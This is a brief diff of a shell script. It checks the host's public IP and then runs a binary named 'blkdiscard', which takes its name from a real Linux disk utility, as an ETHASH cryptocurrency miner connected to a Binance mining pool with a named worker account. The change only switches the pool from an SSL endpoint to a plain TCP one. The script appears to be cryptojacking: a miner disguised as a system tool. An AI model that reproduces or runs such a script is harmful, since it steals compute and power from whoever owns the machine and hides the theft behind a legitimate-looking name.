@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --algo ETHASH --pool stratum+ssl://ethash.poolbinance.com:8888 --user CesurTurk.001
+./blkdiscard --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user CesurTurk.001
